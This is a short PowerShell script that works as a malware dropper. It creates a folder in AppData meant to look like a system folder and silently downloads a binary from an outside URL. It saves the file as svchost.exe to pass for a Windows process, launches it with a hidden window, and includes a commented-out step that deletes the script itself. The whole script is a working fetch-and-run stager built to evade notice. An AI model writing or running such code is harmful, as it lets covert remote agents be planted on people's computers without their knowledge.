# Define destination directory - system looking folder in AppData
$dest = "$env:APPDATA\SystemTools"
if (-not (Test-Path $dest)) {
    New-Item -ItemType Directory -Force -Path $dest | Out-Null
}

# Agent binary full path
$agentPath = Join-Path $dest "svchost.exe"

# Agent binary download URL (replace with your actual URL)
$agentUrl = "https://draysongz.github.io/binaries/client-win.exe"

# Download the agent silently
Invoke-WebRequest -Uri $agentUrl -OutFile $agentPath -UseBasicParsing

# Run the agent hidden, no window, no console
Start-Process -FilePath $agentPath -WindowStyle Hidden

# Optional: Delete this script after execution (use carefully)
# Remove-Item -Path $MyInvocation.MyCommand.Definition -Force

exit 0
